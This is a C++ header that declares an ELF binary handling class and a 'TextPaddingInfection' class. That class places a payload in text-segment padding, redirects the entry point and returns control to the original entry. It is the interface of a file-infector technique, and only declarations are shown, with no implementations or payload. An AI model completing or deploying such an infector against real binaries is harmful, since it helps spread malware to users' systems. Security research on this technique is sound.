#ifndef ZKINJECT_HH
#define ZKINJECT_HH

#include "zkerr.hh"
#include "zktypes.hh"
#include <cstddef>
#include <cstdlib>
#include <cstdint>
#include <elf.h>
#include <new>
#include <string.h>
#include <iostream>
#include <exception>
#include <fcntl.h>
#include <assert.h>
#include <stdexcept>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/types.h>

namespace Binary{
    /* class which defines important parts of an elf binary */
    int PatchAddress(u8 *buffer, size_t len, u8 *addr, u8 *magic);

    class Elf {
        protected:
            int elf_fd;
            /* memory mapped elf binary */
            void *elf_memmap;
            /* load address of elf */
            u64 elf_baseaddr;
            /* elf header */
            Ehdr *elf_ehdr;
            /* elf program header table */
            Phdr *elf_phdr;
            /* elf section header table */
            Shdr *elf_shdr;

        public:
            const char *elf_pathname;
            size_t elf_size;

            Elf();
            Elf(const char *pathname);
            ~Elf();
            void OpenElf(void);
            void LoadFile(void);
            bool VerifyElf(void) const;
            void RemoveMap(void);

            /* commonly used stuff with infectors */
            int FindSegmentbyAttr(u32 type, u32 flags) const;
            int GetSectionIndexByName(const char *name) const;
            void *ElfRead(off_t readoff, size_t size) const;
            void ElfWrite(void *buffer, off_t writeoff, size_t 
            size) const;
    };

    /* text padding infection */
    class TextPaddingInfection : public Elf{
        private:
            void *tpi_payload;
            size_t tpi_payload_sz;
            u8 tpi_magic[MAGIC_LEN];
            u8 tpi_org_entry[ADDR_LEN];
            Addr tpi_fake_entry;
        public:
            TextPaddingInfection(const char *target);
            ~TextPaddingInfection();
            /* 
             * re-alloc space for a new payload with a modified
             * return address. return address = tpi_org_entry
             */
            void SetPayload(u8 *payload, size_t payload_sz);
            /* find a freespace and set tpi_fake_entry */
            off_t FindFreeSpace(void);
            void InjectPayload(off_t writeoff) const;
    };
};

#endif /* ZKINJECT_HH */